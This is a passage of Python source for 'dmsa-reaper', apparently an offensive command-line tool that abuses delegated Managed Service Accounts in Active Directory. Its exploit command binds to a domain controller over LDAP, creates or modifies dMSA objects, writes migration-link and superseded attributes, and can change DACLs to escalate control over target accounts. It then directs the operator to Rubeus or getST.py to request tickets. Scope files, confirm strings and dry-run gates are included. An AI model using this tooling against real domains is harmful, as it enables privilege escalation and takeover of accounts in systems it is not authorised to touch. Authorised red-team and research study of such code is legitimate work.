        help="Directory for operation logs (default: .reaper/operations or DMSA_REAPER_OPS_DIR).",
    ),
    json_out: Optional[Path] = typer.Option(None, "--json"),
):
    """Summarize a mapped lab state and path set."""
    state = MapState.load(state_path)
    paths: list[PathCandidate] = []
    if paths_file:
        raw = json.loads(paths_file.read_text(encoding="utf-8"))
        paths = [PathCandidate.model_validate(p) for p in raw]
    primitive_counts: dict[str, int] = {}
    for path in paths:
        primitive_counts[path.primitive] = primitive_counts.get(path.primitive, 0) + 1
    warnings: list[str] = []
    for collection in (state.dmsas, state.containers, state.targets):
        for obj in collection:
            warnings.extend(getattr(obj, "parse_warnings", []))
    dc_fqdn = None
    if state.environment.dcs:
        dc_fqdn = state.environment.dcs[0].get("dnsHostName")
    kerberos_diag = inspect_kerberos_environment(
        domain=state.environment.domain or "",
        dc_fqdn=dc_fqdn,
        run_cache_checks=True,
    )
    dns_diag = inspect_dns_environment(domain=state.environment.domain or "", dc_fqdn=dc_fqdn)
    operation_lifecycle: dict[str, Any] | None = None
    notes: list[str] = []
    if op_id:
        configure_ops_dir(ops_dir)
        op = load_operation(op_id)
        ldap_status = None
        external_status = None
        rollback_status = None
        if isinstance(op.metadata.get("ldap_verification"), dict):
            ldap_status = op.metadata["ldap_verification"].get("status")
        if isinstance(op.metadata.get("external_verification"), dict):
            external_status = op.metadata["external_verification"].get("status")
        if isinstance(op.metadata.get("rollback_verification"), dict):
            rollback_status = op.metadata["rollback_verification"].get("status")
        failure_classes = []
        for key in ("external_adapter", "external_verification", "kerberos_base_check"):
            value = op.metadata.get(key)
            if isinstance(value, dict) and value.get("failure_class"):
                failure_classes.append(value["failure_class"])
        if op.metadata.get("kerberos_base_check") and not op.verified_external:
            failure_classes.append("kerberos-base-ok-dmsa-unknown")
        operation_lifecycle = {
            "operation_id": op.id,
            "status": op.status,
            "rolled_back": op.rolled_back,
            "rollback_verified": op.rollback_verified,
            "verified_ldap": op.verified_ldap,
            "verified_external": op.verified_external,
            "ldap_verification_status": ldap_status,
            "external_verification_status": external_status,
            "rollback_verification_status": rollback_status,
            "failure_classes": failure_classes,
        }
        if op.verified_ldap:
            notes.append("LDAP state was verified historically.")
        if op.metadata.get("kerberos_base_check"):
            notes.append("Base Kerberos proof was recorded; it does not prove dMSA abuse.")
        if not op.verified_external:
            notes.append("No dMSA ticket proof recorded.")
        if op.rolled_back:
            notes.append("Operation has been rolled back; active dMSA proof cannot be recorded now.")
    base_ready = (
        kerberos_diag.tgt_present is not False
        and kerberos_diag.ccache_style not in {"unset", "keyring"}
        and dns_diag.srv_lookup_ok is not False
    )
    report_failure_classes = sorted(set(
        kerberos_diag.failure_classes
        + dns_diag.failure_classes
        + (operation_lifecycle.get("failure_classes", []) if operation_lifecycle else [])
    ))
    summary = {
        "domain": state.environment.domain,
        "dcs": state.environment.dcs,
        "kds_root_key_status": state.environment.kds_root_key_status,
        "dmsa_schema_status": state.environment.dmsa_schema_status,
        "principal": state.current_principal.model_dump() if state.current_principal else None,
        "path_counts_by_primitive": primitive_counts,
        "sensitive_paths_filtered": "not tracked in this state version",
        "warnings": warnings,
        "operation_lifecycle": operation_lifecycle,
        "kerberos": {
            "base_ready": base_ready,
            "dmsa_proof_verified": bool(operation_lifecycle and operation_lifecycle["verified_external"]),
            "time_skew_ok": kerberos_diag.time_skew_ok,
            "ccache_style": kerberos_diag.ccache_style,
            "cifs_ticket_present": kerberos_diag.cifs_ticket_present,
            "failure_classes": report_failure_classes,
            "notes": notes,
            "diagnostics": kerberos_diag.to_json(),
            "dns": dns_diag.to_json(),
        },
        "recommended_next_steps": [
            "Use LDAP verify for directory state and an operation-bound kerberos-dmsa-proof for ticket proof.",
            "Use SYSVOL/NETLOGON for low-priv SMB Kerberos checks; C$ denial is expected for non-admin users.",
        ],
    }
    if json_out:
        json_out.write_text(json.dumps(summary, indent=2, default=str), encoding="utf-8")
        print(f"[green]wrote lab report JSON[/green] {json_out}")
    else:
        print(json.dumps(summary, indent=2, default=str))


def _print_exploit_result(op) -> None:
    """Print post-exploitation handoff summary after a successful execute."""
    meta = op.metadata
    lines = []
    created_dn = meta.get("created_dmsa_dn")
    created_sam = meta.get("created_dmsa_sam")
    eff_target = meta.get("target_dn") or (
        meta.get("path", {}).get("target_dn") if isinstance(meta.get("path"), dict) else None
    )
    dmsa_dn = meta.get("dmsa_dn") or (
        meta.get("path", {}).get("dmsa_dn") if isinstance(meta.get("path"), dict) else None
    )

    if created_dn:
        lines.append(f"  [bold]created dMSA DN[/bold]    : {created_dn}")
    if created_sam:
        lines.append(f"  [bold]sAMAccountName [/bold]    : {created_sam}")
    if eff_target:
        lines.append(f"  [bold]target DN      [/bold]    : {eff_target}")
    if dmsa_dn and not created_dn:
        lines.append(f"  [bold]modified dMSA  [/bold]    : {dmsa_dn}")

    lines.append("")
    lines.append("  [dim]LDAP state was modified successfully.[/dim]")
    lines.append("  [dim]Validate Kerberos behavior externally using your approved Kerberos tooling,[/dim]")
    lines.append("  [dim]then run verify --mode external to record success.[/dim]")
    lines.append("  [dim]Example: getST.py / Rubeus asktgt → then dmsa-reaper verify --mode external[/dim]")

    print(Panel(
        "\n".join(lines),
        title="[green]exploit complete[/green]",
        subtitle=f"operation {op.id} — run 'dmsa-reaper verify --op {op.id}' to confirm LDAP state",
        expand=False,
    ))


@app.command("exploit")
def exploit_cmd(
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    paths_file: Optional[Path] = typer.Option(
        None, "--paths",
        help="paths.json produced by 'dmsa-reaper paths --json'. "
             "When provided, path IDs are resolved from this file instead of recomputing from --state.",
    ),
    expand_targets: bool = typer.Option(
        False, "--expand-targets",
        help="Expand grouped paths into one row per target (must match the flag used with 'paths').",
    ),
    path_id: str = typer.Option(..., "--path"),
    primitive_name: Optional[str] = typer.Option(None, "--primitive"),
    confirm: bool = typer.Option(False, "--confirm"),
    confirm_string: Optional[str] = typer.Option(
        None,
        "--confirm-string",
        help="Required when scope.requireConfirmString is true; must equal scope.domain.",
    ),
    dry_run: bool = typer.Option(False, "--dry-run", help="Show planned writes; do not touch LDAP."),
    scope_file: Optional[Path] = typer.Option(
        None, "--scope",
        help="Scope JSON file restricting which DNs may be touched.",
    ),
    ops_dir: Optional[Path] = typer.Option(
        None,
        "--ops-dir",
        help="Directory for operation logs (default: .reaper/operations or DMSA_REAPER_OPS_DIR).",
    ),
    lab_unsafe: bool = typer.Option(
        False,
        "--lab-unsafe",
        help="Required for DACL-modifying primitives.",
    ),
    allow_broad_dacl: bool = typer.Option(
        False, "--allow-broad-dacl",
        help="For dacl-* primitives: use broad ACEs if object-specific GUIDs are unavailable.",
    ),
    allow_legacy_oneway_link: bool = typer.Option(
        False,
        "--allow-legacy-oneway-link",
        help="Allow the lab/legacy one-sided pre-patch primitive.",
    ),
    allow_existing_dmsa_legacy_link: bool = typer.Option(
        False,
        "--allow-existing-dmsa-legacy-link",
        help="Allow existing-dmsa-legacy-link, which writes only dMSA-side attributes.",
    ),
    allow_lab_environment: bool = typer.Option(
        False,
        "--allow-lab-environment",
        help="Allow exploit --confirm when dMSA capability is absent or unknown in state.",
    ),
    allow_unmapped_target: bool = typer.Option(
        False,
        "--allow-unmapped-target",
        help="Allow postpatch/DACL-target writes when --target-dn is not proven in state.targets.",
    ),
    allow_unmapped_container: bool = typer.Option(
        False,
        "--allow-unmapped-container",
        help="Allow confirmed execution when the container DN is absent or lacks proven rights in state.",
    ),
    allow_unmapped_dmsa: bool = typer.Option(
        False,
        "--allow-unmapped-dmsa",
        help="Allow confirmed execution when the dMSA DN is absent or lacks proven migration rights in state.",
    ),
    allow_grouped_target_selection: bool = typer.Option(
        False,
        "--allow-grouped-target-selection",
        help="Allow --confirm with grouped paths that require operator-supplied --target-dn.",
    ),
    json_out: Optional[Path] = typer.Option(
        None,
        "--json",
        help="Write machine-readable exploit result or dry-run preview as JSON.",
    ),
    # LDAP auth — required when --confirm is set.
    domain: Optional[str] = typer.Option(None, "--domain", "-d", help="Target domain FQDN."),
    dc_ip: Optional[str] = typer.Option(None, "--dc-ip", help="DC IP address."),
    dc_host: Optional[str] = typer.Option(None, "--dc-host", help="DC hostname."),
    username: Optional[str] = typer.Option(None, "--username", "-u", help="Bind username."),
    password: Optional[str] = typer.Option(None, "--password", "-p", help="Bind password."),
    kerberos: bool = typer.Option(False, "--kerberos", "-k", help="Use ccache (Kerberos)."),
    use_ldaps: bool = typer.Option(False, "--use-ldaps", help="Connect over LDAPS (port 636)."),
    # Primitive parameters.
    target_dn: Optional[str] = typer.Option(None, "--target-dn", help="DN of the target account."),
    container_dn: Optional[str] = typer.Option(
        None, "--container-dn",
        help="OU/container where the new dMSA will be created "
             "(required for dacl-target-escalate; optional override for other primitives).",
    ),
    chain: Optional[str] = typer.Option(
        None, "--chain",
        help="Chain mode for dacl-container-escalate: 'legacy' or 'postpatch'. "
             "Required for dacl-container-escalate. "
             "postpatch additionally writes target-side superseded attrs after dMSA creation.",
    ),
    dmsa_name: Optional[str] = typer.Option(None, "--dmsa-name", help="CN hint for the new dMSA."),

):
    """Plan/execute one selected primitive.

    Use --dry-run to preview planned LDAP writes without binding.
    LDAP writes require --confirm plus LDAP auth options.

    Path ID resolution:
      --paths paths.json   use IDs from a saved 'dmsa-reaper paths --json' output
      --expand-targets     match IDs produced by 'dmsa-reaper paths --expand-targets'
      (default)            match IDs produced by 'dmsa-reaper paths' (grouped mode)

    Scope enforcement:
      --scope scope.json   restrict which DNs may be created or modified
    """
    configure_ops_dir(ops_dir)

    if confirm and dry_run:
        raise typer.BadParameter("--confirm and --dry-run are mutually exclusive")
    if paths_file and expand_targets:
        raise typer.BadParameter("--paths and --expand-targets are mutually exclusive")
    if not confirm and not dry_run:
        raise typer.BadParameter("Use --dry-run to preview or --confirm to perform LDAP writes")

    # Load scope if provided.
    scope = None
    scope_hash: str | None = None
    if scope_file:
        from dmsa_reaper.scope import load_scope
        scope, scope_hash = load_scope(scope_file)

    state: MapState | None = None
    if paths_file:
        raw = json.loads(paths_file.read_text(encoding="utf-8"))
        paths = rank_paths([PathCandidate.model_validate(p) for p in raw])
        state_load_error: Exception | None = None
        try:
            state = MapState.load(state_path)
            if scope is not None and state.environment.domain:
                from dmsa_reaper.scope import check_domain_match
                try:
                    check_domain_match(state.environment.domain, scope)
                except ValueError as exc:
                    raise typer.BadParameter(str(exc)) from exc
        except typer.BadParameter:
            raise
        except Exception as exc:
            state_load_error = exc
        if confirm and state is None and not allow_lab_environment:
            raise typer.BadParameter(
                f"--confirm with --paths requires a valid --state file: {state_load_error}"
            )
    else:
        state = MapState.load(state_path)
        # Validate scope domain against mapped domain.
        if scope is not None and state.environment.domain:
            from dmsa_reaper.scope import check_domain_match
            try:
                check_domain_match(state.environment.domain, scope)
            except ValueError as exc:
                raise typer.BadParameter(str(exc)) from exc
        paths = rank_paths(classify_paths(state, expand_targets=expand_targets))

    selected = next((p for p in paths if p.id == path_id), None)
    if not selected:
        raise typer.BadParameter(f"path not found: {path_id}")

    if not selected.executable:
        if selected.primitive in {"self-write-map", "self-pkinit-loop"}:
            raise typer.BadParameter(
                f"path {selected.id} ({selected.primitive}) is informational and is not "
                "a runnable exploit primitive."
            )
        raise typer.BadParameter(
            f"path {selected.id} ({selected.primitive}) is not directly executable.\n"
            f"This path requires a manual DACL modification step before the primitive can run.\n"
            f"Required rights: {', '.join(selected.required_rights)}"
        )

    if selected.requires_operator_target and not target_dn and not selected.target_dn:
        raise typer.BadParameter(
            f"path {selected.id} ({selected.primitive}) requires a target account.\n"
            f"Pass --target-dn <DN-of-target-account>."
        )

    primitives = get_primitives()
    primitive = primitives.get(primitive_name or selected.primitive)
    if not primitive:
        raise typer.BadParameter(f"unknown primitive: {primitive_name or selected.primitive}")
    if not primitive.check(selected):
        raise typer.BadParameter(f"primitive {primitive.name} cannot execute path {selected.id}")

    if primitive.name == "legacy-oneway-link" and not allow_legacy_oneway_link:
        raise typer.BadParameter(
            "legacy-oneway-link is lab/legacy only and requires --allow-legacy-oneway-link. "
            "Patched KDCs may accept LDAP writes but refuse ticket semantics."
        )
    if primitive.name == "existing-dmsa-legacy-link" and not allow_existing_dmsa_legacy_link:
        raise typer.BadParameter(
            "existing-dmsa-legacy-link is lab/legacy only and requires "
            "--allow-existing-dmsa-legacy-link. Patched KDCs require reciprocal target-side state."
        )

    if primitive.modifies_directory and scope is None:
        raise typer.BadParameter(
            f"{primitive.name} performs LDAP writes and requires --scope <file>."
        )
    if confirm and scope is not None and scope.require_confirm_string:
        if confirm_string != scope.domain:
            raise typer.BadParameter(
                "--confirm-string must be provided and must exactly match scope.domain "
                f"({scope.domain!r})"
            )
    if confirm and selected.requires_operator_target and not allow_grouped_target_selection:
        raise typer.BadParameter(
            f"path {selected.id} ({selected.primitive}) is grouped and requires --target-dn. "
            "For confirmed execution use --expand-targets, or pass "
            "--allow-grouped-target-selection for an explicit operator-selected target."
        )

    if confirm and state is not None and state.environment.dmsa_capable_status != CheckStatus.present:
        if not allow_lab_environment:
            raise typer.BadParameter(
                "Mapped environment is not confirmed dMSA-capable "
                f"(dmsa_capable_status={state.environment.dmsa_capable_status}). "
                "Use --allow-lab-environment only for an explicitly authorized lab override."
            )

    # Validate --chain for dacl-container-escalate: must be explicit, no default.
    if primitive.name == "dacl-container-escalate":
        if chain is None:
            raise typer.BadParameter(
                "--chain is required for dacl-container-escalate.\n"
                "  --chain legacy    — write ManagedAccountPrecededByLink only\n"
                "  --chain postpatch — also write msDS-Superseded* on target (patched DCs)"
            )
        if chain not in ("legacy", "postpatch"):
            raise typer.BadParameter(
                f"--chain must be 'legacy' or 'postpatch', got: {chain!r}"
            )
    elif chain is not None and chain not in ("legacy", "postpatch"):
        raise typer.BadParameter(
            f"--chain must be 'legacy' or 'postpatch', got: {chain!r}"
        )

    if primitive.name in _DACL_PRIMITIVES:
        from dmsa_reaper.scope import check_dacl_scope_gates
        try:
            check_dacl_scope_gates(
                scope,
                lab_unsafe=lab_unsafe,
                broad_requested=allow_broad_dacl,
            )
        except ValueError as exc:
            raise typer.BadParameter(str(exc)) from exc

    effective_target_dn = target_dn or selected.target_dn
    target_warnings, exact_target_writable_attrs = _validate_exact_postpatch_target(
        state=state,
        target_dn=effective_target_dn,
        primitive_name=primitive.name,
        chain=chain,
        allow_unmapped_target=allow_unmapped_target,
        confirm=confirm,
    )
    for warning in target_warnings:
        print(f"[yellow]PREFLIGHT WARNING:[/yellow] {warning}")

    # ── Runtime state revalidation for confirmed execution ─────────────────
    # Paths.json is advisory; state.json is the source of truth for writes.
    # Each check raises typer.BadParameter unless the corresponding override
    # flag is supplied (which records a warning and stores the flag in metadata).
    _container_state_warnings: list[str] = []
    _dmsa_state_warnings: list[str] = []
    _target_dacl_warnings: list[str] = []

    if confirm:
        if primitive.name in ("postpatch-mutual-pair", "legacy-oneway-link"):
            _eff_container = container_dn or selected.container_dn
            if _eff_container:
                _container_state_warnings = _check_container_create_rights(
                    state, _eff_container, allow_unmapped_container
                )

        if primitive.name in ("existing-dmsa-postpatch-mutual", "existing-dmsa-legacy-link"):
            if selected.dmsa_dn:
                _dmsa_state_warnings = _validate_dmsa_migration_rights(
                    state, selected.dmsa_dn, allow_unmapped_dmsa
                )

        if primitive.name == "dacl-container-escalate":
            _eff_container = container_dn or selected.container_dn
            if _eff_container:
                _container_state_warnings = _validate_container_dacl_control(
                    state, _eff_container, allow_unmapped_container
                )

        if primitive.name == "dacl-target-escalate":
            _eff_container = container_dn or selected.container_dn
            if _eff_container:
                _container_state_warnings = _check_container_create_rights(
                    state, _eff_container, allow_unmapped_container
                )
            _eff_target = target_dn or selected.target_dn
            if _eff_target:
                _target_dacl_warnings = _validate_target_dacl_control(
                    state, _eff_target, allow_unmapped_target
                )

    for warning in _container_state_warnings + _dmsa_state_warnings + _target_dacl_warnings:
        print(f"[yellow]PREFLIGHT WARNING:[/yellow] {warning}")

    # Run preflight checks (scope, target DN, container DN, etc.)
    try:
        warnings = primitive.preflight(
            selected, scope=scope, target_dn=target_dn, container_dn=container_dn
        )
    except Exception as exc:
        raise typer.BadParameter(f"Preflight failed: {exc}") from exc
    for w in warnings:
        print(f"[yellow]PREFLIGHT WARNING:[/yellow] {w}")

    if dry_run:
        # Build an in-memory preview operation — no file is written to .reaper/.
        from dmsa_reaper.models import Operation
        preview_op = Operation(
            id="DRY-RUN",
            primitive=selected.primitive,
            path_id=selected.id,
            metadata={"path": selected.model_dump()},
        )
        if target_dn:
            preview_op.metadata["target_dn"] = target_dn
        if exact_target_writable_attrs is not None:
            preview_op.metadata["target_writable_attrs"] = exact_target_writable_attrs
        if target_warnings:
            preview_op.metadata["warnings"] = target_warnings
            preview_op.metadata["allow_unmapped_target"] = True
        if _container_state_warnings:
            preview_op.metadata.setdefault("warnings", []).extend(_container_state_warnings)
            preview_op.metadata["allow_unmapped_container"] = True
        if _dmsa_state_warnings:
            preview_op.metadata.setdefault("warnings", []).extend(_dmsa_state_warnings)
            preview_op.metadata["allow_unmapped_dmsa"] = True
        if _target_dacl_warnings:
            preview_op.metadata.setdefault("warnings", []).extend(_target_dacl_warnings)
            preview_op.metadata.setdefault("allow_unmapped_target", True)
        if container_dn:
            preview_op.metadata["container_dn"] = container_dn
        if dmsa_name:
            preview_op.metadata["dmsa_name"] = dmsa_name
        if allow_broad_dacl:
            preview_op.metadata["allow_broad_dacl"] = True
        if lab_unsafe:
            preview_op.metadata["lab_unsafe"] = True
        if scope is not None and scope.allow_broad_dacl:
            preview_op.metadata["scope_allow_broad_dacl"] = True
        if chain:
            preview_op.metadata["chain"] = chain
        if allow_existing_dmsa_legacy_link:
            preview_op.metadata["allow_existing_dmsa_legacy_link"] = True
        # Inject state metadata so dry-run output reflects actual principal and schema.
        if state is not None and state.current_principal:
            preview_op.metadata.setdefault("principal_sid", state.current_principal.sid)
        if state is not None and state.schema_cache.attr_guids:
            preview_op.metadata.setdefault("attr_guids", state.schema_cache.attr_guids)
        if state is not None and state.schema_cache.dmsa_class_guid:
            preview_op.metadata.setdefault("dmsa_class_guid", state.schema_cache.dmsa_class_guid)
        steps = primitive.dry_run_steps(preview_op)
        if json_out:
            _write_json(
                json_out,
                {
                    "mode": "dry-run",
                    "operation": preview_op.model_dump(mode="json"),
                    "steps": steps,
                    "ldap_writes_performed": False,
                },
            )
            print(f"[green]wrote exploit dry-run JSON[/green] {json_out}")
        print(Panel(
            "\n".join(steps),
            title=f"[yellow]DRY RUN[/yellow]  {selected.primitive}  {path_id}",
            subtitle="No LDAP writes will be made",
            expand=False,
        ))
        return

    if confirm and not domain and not dc_ip and not dc_host:
        raise typer.BadParameter("--domain (or --dc-ip / --dc-host) is required with --confirm")

    conn = None
    if confirm:
        cfg = LdapAuthConfig(
            domain=domain or "",
            dc_ip=dc_ip,
            dc_host=dc_host,
            username=username,
            password=password,
            kerberos=kerberos,
            use_ldaps=use_ldaps,
        )
        conn = bind(cfg)

    # Build the durable operation log entry - written before any LDAP write.
    op = primitive.plan(selected)

    if target_dn:
        op.metadata["target_dn"] = target_dn
    if exact_target_writable_attrs is not None:
        op.metadata["target_writable_attrs"] = exact_target_writable_attrs
    if target_warnings:
        op.metadata.setdefault("warnings", []).extend(target_warnings)
        op.metadata["allow_unmapped_target"] = True
    if _container_state_warnings:
        op.metadata.setdefault("warnings", []).extend(_container_state_warnings)
        op.metadata["allow_unmapped_container"] = True
    if _dmsa_state_warnings:
        op.metadata.setdefault("warnings", []).extend(_dmsa_state_warnings)
        op.metadata["allow_unmapped_dmsa"] = True
    if _target_dacl_warnings:
        op.metadata.setdefault("warnings", []).extend(_target_dacl_warnings)
        op.metadata.setdefault("allow_unmapped_target", True)
    if container_dn:
        op.metadata["container_dn"] = container_dn
    if dmsa_name:
        op.metadata["dmsa_name"] = dmsa_name
    if allow_broad_dacl:
        op.metadata["allow_broad_dacl"] = True
    if lab_unsafe:
        op.metadata["lab_unsafe"] = True
    if scope is not None and scope.allow_broad_dacl:
        op.metadata["scope_allow_broad_dacl"] = True
    if chain:
        op.metadata["chain"] = chain
    if allow_existing_dmsa_legacy_link:
        op.metadata["allow_existing_dmsa_legacy_link"] = True
    if scope_hash:
        op.scope_file_hash = scope_hash

    # Embed current principal SID for DACL primitives that need it to build ACEs.
    if state is not None and state.current_principal:
        op.metadata.setdefault("principal_sid", state.current_principal.sid)

    # Embed schema_cache data for dacl-* primitives.
    if state is not None and state.schema_cache.attr_guids:
        op.metadata.setdefault("attr_guids", state.schema_cache.attr_guids)
    if state is not None and state.schema_cache.dmsa_class_guid:
        op.metadata.setdefault("dmsa_class_guid", state.schema_cache.dmsa_class_guid)

    # For postpatch chain: embed the target's writable attrs so the primitive can
    # verify target-side access before any LDAP writes.
    save_operation(op)

    op = primitive.execute(op, confirm=confirm, conn=conn)
    save_operation(op)
    if json_out:
        _write_json(
            json_out,
            {
                "mode": "confirm",
                "operation": op.model_dump(mode="json"),
                "ldap_writes_performed": True,
            },
        )
        print(f"[green]wrote exploit JSON[/green] {json_out}")
    print(f"[yellow]operation[/yellow] {op.id} status={op.status}")
    if op.status == "executed":
        _print_exploit_result(op)


@app.command("verify")
def verify_cmd(
    op_id: str = typer.Option(..., "--op", help="Operation ID to verify (e.g. OP-20260528-deadbeef)."),
    mode: str = typer.Option("ldap", "--mode", help="Verification mode: ldap | external."),
    json_out: Optional[Path] = typer.Option(None, "--json", help="Write verification result as JSON."),
    external_cmd: Optional[str] = typer.Option(
        None, "--external-cmd",
        help="Shell command for --mode external. Requires --allow-shell-external.",
    ),
    external_argv: Optional[list[str]] = typer.Option(
        None, "--external-argv",
        help=(
            "Argument list for --mode external (preferred — no shell injection risk). "
            "Example: --external-argv rubeus.exe asktgt /user:dmsa$ /domain:corp.local"
        ),
    ),
    evidence_file: Optional[Path] = typer.Option(
        None,
        "--evidence-file",
        help="Structured Kerberos proof JSON file to record for --mode external.",
    ),
    kerberos_adapter: Optional[str] = typer.Option(
        None,
        "--kerberos-adapter",
        help="Optional external Kerberos proof adapter name. No adapter runs by default.",
    ),
    adapter_command: Optional[str] = typer.Option(
        None,
        "--adapter-command",
        help=(
            "Command template for --kerberos-adapter. Placeholders: "
            "{operation_id}, {target_dn}, {target_sam}, {created_dmsa_dn}, {created_dmsa_sam}."
        ),
    ),
    adapter_command_file: Optional[Path] = typer.Option(
        None,
        "--adapter-command-file",
        help="JSON file containing adapter command template or argv list.",
    ),
    adapter_dry_run: bool = typer.Option(
        False,
        "--adapter-dry-run",
        help="Render adapter command without executing it.",
    ),
    lab_unsafe_kerberos_proof: bool = typer.Option(
        False,
        "--lab-unsafe-kerberos-proof",
        help="Required to execute an external Kerberos adapter command.",
    ),
    scope_file: Optional[Path] = typer.Option(
        None,
        "--scope",
        help="Scope JSON required when executing an external Kerberos adapter.",
    ),
    confirm_string: Optional[str] = typer.Option(
        None,
        "--confirm-string",
        help="Required with --kerberos-adapter; must match scope.domain.",
    ),
    allow_shell_external: bool = typer.Option(
        False,
        "--allow-shell-external",
        help="Allow --external-cmd to run through shell=True.",
    ),
    store_external_output: bool = typer.Option(
        False,
        "--store-external-output",
        help="Store full stdout/stderr in the operation log instead of hashes and lengths only.",
    ),
    ops_dir: Optional[Path] = typer.Option(
        None,
        "--ops-dir",
        help="Directory for operation logs (default: .reaper/operations or DMSA_REAPER_OPS_DIR).",
    ),
    domain: Optional[str] = typer.Option(None, "--domain", "-d", help="Target domain FQDN."),
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
):
    """Verify that an operation's writes are still in effect.

    --mode ldap   (default) — live LDAP attribute/existence check.
    --mode external         — run a command; exit 0 = verified.
                              Prefer --external-argv to avoid shell injection.
                              --external-cmd requires --allow-shell-external.
    """
    configure_ops_dir(ops_dir)
    op = load_operation(op_id)

    if mode == "ldap":
        if not domain and not dc_ip and not dc_host:
            raise typer.BadParameter("--domain (or --dc-ip / --dc-host) is required for --mode ldap")
        cfg = _make_ldap_config(
            domain or "", dc_ip, dc_host, username, password, kerberos, use_ldaps
        )
        conn = bind(cfg)
        details = verify_operation_ldap_details(op, conn=conn)
        record_ldap_verification(op, details)
        op.metadata["ldap_verification_note"] = (
            "LDAP-state verification does not prove Kerberos ticket issuance."
        )
        save_operation(op)
        if json_out:
            _write_json(
                json_out,
                {
                    "mode": "ldap",
                    "operation_id": op.id,
                    "status": details["status"],
                    "ok": details["ok"],
                    "details": details,
                    "operation": op.model_dump(mode="json"),
                    "note": op.metadata["ldap_verification_note"],
                },
            )
            print(f"[green]wrote verify JSON[/green] {json_out}")
        print("LDAP-state verification does not prove Kerberos ticket issuance.")
        for created in details["created_objects"]:
            print(
                f"created-object {created['status']}: {created['dn']} "
                f"({created['reason']})"
            )
        for attr in details["attributes"]:
            print(
                f"attribute {attr['status']}: {attr['dn']} {attr['attribute']} "
                f"({attr['reason']})"
            )
        if details["partial_reasons"]:
            for reason in details["partial_reasons"]:
                print(f"partial: {reason}")
        if details["failures"]:
            for failure in details["failures"]:
                print(f"failed: {failure}")
        print(
            "target-side verified="
            f"{details['target_side_verified']} created-objects verified="
            f"{details['created_objects_verified']}"
        )
        print(f"mode=ldap verified={details['status']}")

    elif mode == "external":
        if evidence_file:
            evidence, digest = load_evidence_file(evidence_file)
            try:
                external_meta = validate_kerberos_evidence(op, evidence, digest)
            except ExternalProofError as exc:
                raise typer.BadParameter(str(exc)) from exc
            if external_meta.get("type") == BASE_PROOF_TYPE:
                record_kerberos_base_check(op, external_meta)
            else:
                record_external_verification(op, external_meta)
            save_operation(op)
            if json_out:
                _write_json(
                    json_out,
                    {
                        "mode": "external",
                        "operation_id": op.id,
                        "status": external_meta["status"],
                        "ok": external_meta["ok"],
                        "proof": external_meta,
                        "operation": op.model_dump(mode="json"),
                    },
                )
                print(f"[green]wrote verify JSON[/green] {json_out}")
            if external_meta.get("type") == BASE_PROOF_TYPE:
                print(
                    "mode=external evidence-file kerberos-base-proof recorded=true "
                    "verified_external=false "
                    f"evidence_sha256={external_meta['evidence_sha256']}"
                )
            else:
                print(
                    "mode=external evidence-file verified=true "
                    f"evidence_sha256={external_meta['evidence_sha256']}"
                )
        elif kerberos_adapter:
            if op.status != "executed" or op.rolled_back:
                raise typer.BadParameter(
                    "external Kerberos adapter can only run for an executed, not rolled-back operation"
                )
            if adapter_command_file is not None:
                adapter_command = _adapter_template_from_file(adapter_command_file)
            if not adapter_command:
                raise typer.BadParameter(
                    "--adapter-command or --adapter-command-file is required with --kerberos-adapter"
                )
            rendered = _render_adapter_command(adapter_command, op)
            if adapter_dry_run:
                if json_out:
                    _write_json(
                        json_out,
                        {
                            "mode": "external",
                            "adapter": kerberos_adapter,
                            "dry_run": True,
                            "command_sha256": hashlib.sha256(rendered.encode("utf-8")).hexdigest(),
                            "operation_id": op.id,
                        },
                    )
                    print(f"[green]wrote adapter dry-run JSON[/green] {json_out}")
                print(f"adapter={kerberos_adapter} dry-run command={rendered}")
                return
            if not lab_unsafe_kerberos_proof:
                raise typer.BadParameter(
                    "--lab-unsafe-kerberos-proof is required to execute an adapter command"
                )
            if scope_file is None:
                raise typer.BadParameter("--scope is required to execute an adapter command")
            from dmsa_reaper.scope import load_scope
            scope, _ = load_scope(scope_file)
            if confirm_string != scope.domain:
                raise typer.BadParameter(
                    "--confirm-string must be provided and must exactly match scope.domain "
                    f"({scope.domain!r})"
                )
            proc = subprocess.run(shlex.split(rendered), shell=False, capture_output=True, text=True)
            output_meta = _external_output_metadata(
                mode=f"adapter:{kerberos_adapter}",
                exit_code=proc.returncode,
                stdout=proc.stdout,
                stderr=proc.stderr,
                store_output=False,
            )
            if proc.returncode != 0:
                output_meta["failure_class"] = _classify_external_failure(
                    proc.stdout, proc.stderr, dmsa=True
                )
                output_meta["status"] = "failed"
                op.metadata["external_adapter"] = output_meta
                save_operation(op)
                raise typer.BadParameter(
                    f"adapter command exited {proc.returncode}; stdout/stderr hashes recorded only"
                )
            try:
                evidence = json.loads(proc.stdout)
            except json.JSONDecodeError as exc:
                output_meta["failure_class"] = _classify_external_failure(
                    proc.stdout, proc.stderr, dmsa=True
                )
                output_meta["status"] = "unstructured-output"
                op.metadata["external_adapter"] = output_meta
                save_operation(op)
                raise typer.BadParameter("adapter stdout must be structured JSON evidence") from exc
            digest = hashlib.sha256(proc.stdout.encode("utf-8")).hexdigest()
            try:
                external_meta = validate_kerberos_evidence(op, evidence, digest)
            except ExternalProofError as exc:
                output_meta["failure_class"] = "kerberos-tooling-inconclusive"
                output_meta["status"] = "invalid-proof"
                op.metadata["external_adapter"] = output_meta
                save_operation(op)
                raise typer.BadParameter(str(exc)) from exc
            external_meta["adapter"] = {
                "name": kerberos_adapter,
                "command_sha256": hashlib.sha256(rendered.encode("utf-8")).hexdigest(),
                "output": output_meta,
            }
            if external_meta.get("type") == BASE_PROOF_TYPE:
                record_kerberos_base_check(op, external_meta)
            else:
                record_external_verification(op, external_meta)
            save_operation(op)
            if json_out:
                _write_json(
                    json_out,
                    {
                        "mode": "external",
                        "operation_id": op.id,
                        "status": external_meta["status"],
                        "ok": external_meta["ok"],
                        "proof": external_meta,
                        "operation": op.model_dump(mode="json"),
                    },
                )
                print(f"[green]wrote verify JSON[/green] {json_out}")
            if external_meta.get("type") == BASE_PROOF_TYPE:
                print(
                    f"mode=external adapter={kerberos_adapter} kerberos-base-proof recorded=true "
                    "verified_external=false "
                    f"evidence_sha256={external_meta['evidence_sha256']}"
                )
            else:
                print(
                    f"mode=external adapter={kerberos_adapter} verified=true "
                    f"evidence_sha256={external_meta['evidence_sha256']}"
                )
        elif external_argv:
